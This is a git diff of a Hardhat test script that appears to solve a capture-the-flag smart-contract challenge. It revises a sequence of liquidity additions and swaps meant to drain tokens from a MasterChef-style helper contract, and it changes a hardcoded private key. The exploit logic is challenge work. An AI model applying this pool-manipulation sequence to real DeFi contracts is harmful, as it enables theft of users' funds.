@@ -14,7 +14,7 @@ let tx: any;
 
 before(async () => {
     eoa = await getEoaOrPrivateKey(
-        `0x2ab02d753c07d5194bb4eccde74ce308c9e8ea00104e70ba975d4250d4141f98`
+        `0x143988c8e6f559f99713a0777ce2bfa0e620f61eac8ca15dcfe6c31fc79af077`
     );
 
     eoaAddress = await eoa.getAddress();
@@ -22,7 +22,7 @@ before(async () => {
     // console.log(eoaAddress)
 
     setup = await hre.ethers.getContractAt("contracts/rescue/contracts/Setup.sol:Setup",
-        "0xFA86A4d66F8C8927C225059068700B238ad7b45C");
+        "0x5161Af4948f9659a682410c6E391eFfb0e7be997");
 });
 
 it("solves the challenge", async function () {
@@ -65,7 +65,7 @@ it("solves the challenge", async function () {
     console.log("")
     console.log("ERC20_1 balance: ", await erc20_1.balanceOf(eoaAddress))
     if (true) {
-        const txrr = await weth9_contract.deposit({ value: hre.ethers.utils.parseEther(`1`) })
+        const txrr = await weth9_contract.deposit({ value: hre.ethers.utils.parseEther(`5`) })
         await txrr.wait()
     }
 
@@ -100,12 +100,9 @@ it("solves the challenge", async function () {
     // await approvedd.wait()
     // console.log("Pair1b approved")
 
-    const tx = await router_contract.callStatic.addLiquidity(erc20_1.address, weth9_contract.address, 1001, 10000, 0, 0, eoaAddress, timestampBefore + 31525200)
-    // await tx.wait()
-    console.log("Liquidity MyToken-Weth9: " + tx)
-    // console.log("Liquidity MyToken-Weth9: " + JSON.stringify(tx))
-
-    const txx = await router_contract.addLiquidity(erc20_1.address, weth9_contract.address, 1001, 10000, 0, 0, eoaAddress, timestampBefore + 31525200)
+    const tx = await router_contract.callStatic.addLiquidity(erc20_1.address, weth9_contract.address, 1001000000, 1001, 0, 0, eoaAddress, timestampBefore + 31525200)
+    console.log("\nLiquidity MyToken-Weth9: " + tx)
+    const txx = await router_contract.addLiquidity(erc20_1.address, weth9_contract.address, 1001000000, 1001, 0, 0, eoaAddress, timestampBefore + 31525200)
     await txx.wait()
 
     // console.log("Prepare for exchange 1")
@@ -113,20 +110,51 @@ it("solves the challenge", async function () {
     // const txxxx = await router_contract.addLiquidity(weth9_contract.address, pair1b.address, 1001, 0, 0, 0, eoaAddress, timestampBefore + 31525200)
     // await txxxx.wait()
 
-    console.log("Prepare for exchange 2")
-    console.log("Amounts: " + await router_contract.callStatic.swapExactTokensForTokens(hre.ethers.utils.parseEther('0.001'), 1, [weth9_contract.address, pair1b.address], mcHelper_contract.address, timestampBefore + 31525200))
+    console.log("\nPrepare for exchange WETH -> Pair1b [account]")
+    console.log("Amounts: " + await router_contract.callStatic.swapExactTokensForTokens(hre.ethers.utils.parseEther('0.001'), 1, [weth9_contract.address, pair1b.address], eoaAddress, timestampBefore + 31525200))
+    // console.log("Amounts: " + await router_contract.callStatic.swapExactTokensForTokens(hre.ethers.utils.parseEther('0.001'), 1, [weth9_contract.address, pair1b.address], mcHelper_contract.address, timestampBefore + 31525200))
 
-    const txxx = await router_contract.swapExactTokensForTokens(hre.ethers.utils.parseEther('0.001'), 1, [weth9_contract.address, pair1b.address], mcHelper_contract.address, timestampBefore + 31525200)
+    const txxxl = await router_contract.swapExactTokensForTokens(hre.ethers.utils.parseEther('0.001'), 1,
+        [weth9_contract.address, pair1b.address], eoaAddress, timestampBefore + 31525200)
+    await txxxl.wait()
+
+    console.log("Prepare for exchange 3.1")
+    // const txxx = await router_contract.swapExactTokensForTokens(hre.ethers.utils.parseEther('0.0001'), 1,
+    //     [weth9_contract.address, pair1b.address], mcHelper_contract.address, timestampBefore + 31525200)
+    // await txxx.wait()
+    const txrr = await weth9_contract.deposit({ value: hre.ethers.utils.parseEther(`5`) })
+    await txrr.wait()
+
+    console.log("Prepare for exchange 3.11")
+    // const txtr = await pair1b.transfer(mcHelper_contract.address, hre.ethers.utils.parseEther('0.001'))
+    // txtr.wait()
+
+    console.log("\nPrepare for exchange Weth -> Pair1b [helper]")
+    console.log("Amounts: " + await router_contract.callStatic.swapExactTokensForTokens(hre.ethers.utils.parseEther('0.001'), 1, [weth9_contract.address, pair1b.address], mcHelper_contract.address, timestampBefore + 31525200))
+    const txxx = await router_contract.swapExactTokensForTokens(hre.ethers.utils.parseEther('0.001'), 1,
+        [weth9_contract.address, pair1b.address], mcHelper_contract.address, timestampBefore + 31525200)
     await txxx.wait()
 
-    console.log("Stupid trade")
 
-    const txxxx = await router_contract.swapExactTokensForTokens(hre.ethers.utils.parseEther('0.001'), 1, [weth9_contract.address, weth9_contract.address], mcHelper_contract.address, timestampBefore + 31525200)
-    await txxxx.wait()
+    console.log("Prepare Liquidity 2")
+
+    const txl = await router_contract.callStatic.addLiquidity(erc20_1.address, pair1b.address, 1001000000, 1001, 0, 0, eoaAddress, timestampBefore + 31525200)
+    console.log("\nLiquidity MyToken-Pair1b: " + txl)
+    const txxl = await router_contract.addLiquidity(erc20_1.address, pair1b.address, 1001000000, 1001, 0, 0, eoaAddress, timestampBefore + 31525200)
+    await txxl.wait()
+
+    console.log("==================")
+
+    // const txxxx = await router_contract.swapExactTokensForTokens(hre.ethers.utils.parseEther('0.001'), 1, [weth9_contract.address, weth9_contract.address], mcHelper_contract.address, timestampBefore + 31525200)
+    // await txxxx.wait()
+    const approved333 = await erc20_1.approve(mcHelper_contract.address, hre.ethers.constants.MaxUint256);
+    await approved333.wait()
+    const txrrr = await weth9_contract.deposit({ value: hre.ethers.utils.parseEther(`1`) })
+    await txrrr.wait()
 
     console.log("Prepare for investig poolToken")
-    const tx2 = await mcHelper_contract.swapTokenForPoolToken(0, weth9_contract.address, hre.ethers.utils.parseEther('0.001'), 0);
-    await tx2.wait()
+    // const tx2 = await mcHelper_contract.swapTokenForPoolToken(0, erc20_1.address, 2070, 0);
+    // await tx2.wait()
 
     console.log("ERC20_1 balance: ", await erc20_1.balanceOf(eoaAddress))
     console.log("Weth9 balance: ", await weth9_contract.balanceOf(eoaAddress))
@@ -145,22 +173,31 @@ it("solves the challenge", async function () {
     console.log("Weth9 balance on Helper: " + (await weth9_contract.balanceOf(mcHelper_contract.address)))
     console.log("Pair1b balance on Helper: " + (await pair1b.balanceOf(mcHelper_contract.address)))
 
-    const erc20_2 = await ercFactory.deploy()
-    const like20_mytoken2 = await hre.ethers.getContractAt("ERC20Like", erc20_2.address, eoa2)
-    const approved3 = await like20_mytoken2.approve(mcHelper_contract.address, hre.ethers.constants.MaxUint256);
-    await approved3.wait()
-    const approved4 = await like20_mytoken2.approve(router_contract.address, hre.ethers.constants.MaxUint256);
-    await approved4.wait()
-    console.log("MyToken2 apporved x2")
+    console.log("\n>>> SWAP <<<")
+    // const txxxx = await router_contract.swapExactTokensForTokens(hre.ethers.utils.parseEther('0.001'), 1, [weth9_contract.address, weth9_contract.address], mcHelper_contract.address, timestampBefore + 31525200)
+    // await txxxx.wait()
+    const tx2 = await mcHelper_contract.swapTokenForPoolToken(0, erc20_1.address, 10000000000000, 0);
+    await tx2.wait()
 
-    const tx3 = await router_contract.addLiquidity(erc20_1.address, erc20_2.address, 1001, 10000, 0, 0, eoaAddress, timestampBefore + 31525200)
-    await tx3.wait()
-    const tx4 = await router_contract.addLiquidity(erc20_2.address, weth9_contract.address, 1001, 10000, 0, 0, eoaAddress, timestampBefore + 31525200)
-    await tx4.wait()
+    console.log("")
+    console.log("Weth9 balance on Helper: " + (await weth9_contract.balanceOf(mcHelper_contract.address)))
+    console.log("Pair1b balance on Helper: " + (await pair1b.balanceOf(mcHelper_contract.address)))
+    // const erc20_2 = await ercFactory.deploy()
+    // const like20_mytoken2 = await hre.ethers.getContractAt("ERC20Like", erc20_2.address, eoa2)
+    // const approved3 = await like20_mytoken2.approve(mcHelper_contract.address, hre.ethers.constants.MaxUint256);
+    // await approved3.wait()
+    // const approved4 = await like20_mytoken2.approve(router_contract.address, hre.ethers.constants.MaxUint256);
+    // await approved4.wait()
+    // console.log("MyToken2 apporved x2")
+
+    // const tx3 = await router_contract.addLiquidity(erc20_1.address, erc20_2.address, 1001, 1001, 0, 0, eoaAddress, timestampBefore + 31525200)
+    // await tx3.wait()
+    // const tx4 = await router_contract.addLiquidity(erc20_2.address, weth9_contract.address, 1001, 1001, 0, 0, eoaAddress, timestampBefore + 31525200)
+    // await tx4.wait()
 
 
     // console.log("Weth9 balance on Helper: " + (await weth9_contract.balanceOf(mcHelper_contract.address)))
-    
+
 
     // const random_contract = await hre.ethers.getContractAt("Random", await setup.random());
     // await random_contract.solve(4)
